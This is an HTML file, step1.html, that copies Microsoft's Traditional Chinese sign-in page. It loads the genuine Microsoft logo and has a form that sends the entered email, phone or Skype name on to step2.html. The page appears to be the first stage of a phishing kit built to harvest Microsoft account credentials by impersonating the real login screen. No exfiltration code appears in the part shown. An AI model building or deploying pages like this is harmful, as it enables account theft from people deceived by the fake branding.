<!-- step1.html -->
<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>登入 - Microsoft</title>
  <style>
    body {
      margin: 0;
      font-family: Segoe UI, sans-serif;
      background: radial-gradient(circle at center, #e3ece8, #f4e3df);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-box {
      background-color: white;
      padding: 40px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      width: 320px;
    }
    .login-box img {
      width: 108px;
    }
    .login-box h2 {
      font-size: 24px;
      margin: 24px 0 16px;
    }
    .login-box input[type="text"] {
      width: 100%;
      padding: 10px;
      margin: 8px 0 16px;
      border: none;
      border-bottom: 1px solid #888;
      font-size: 16px;
    }
    .login-box a {
      color: #0067b8;
      text-decoration: none;
      font-size: 14px;
    }
    .btn {
      background-color: #0067b8;
      color: white;
      padding: 10px 20px;
      border: none;
      float: right;
      font-size: 14px;
      cursor: pointer;
    }
    .options {
      margin-top: 20px;
      text-align: center;
      font-size: 14px;
    }
    footer {
      position: absolute;
      bottom: 10px;
      font-size: 12px;
      color: #555;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://logincdn.msauth.net/16.000.31818.1/images/microsoft_logo_ee5c8c9fb6248c778a1d.svg" alt="Microsoft Logo" />
    <h2>登入</h2>
    <form method="POST" action="step2.html">
      <input type="text" name="username" placeholder="電子郵件、電話或 Skype" required />
      <a href="#">沒有帳戶嗎？ 建立一個!</a><br />
      <a href="#">無法存取您的帳戶嗎？</a>
      <button type="submit" class="btn">下一步</button>
    </form>
  </div>
  <div class="options">
    <button disabled>登入選項</button>
  </div>
  <footer>
    使用條款 隱私權與 Cookie
  </footer>
</body>
</html>
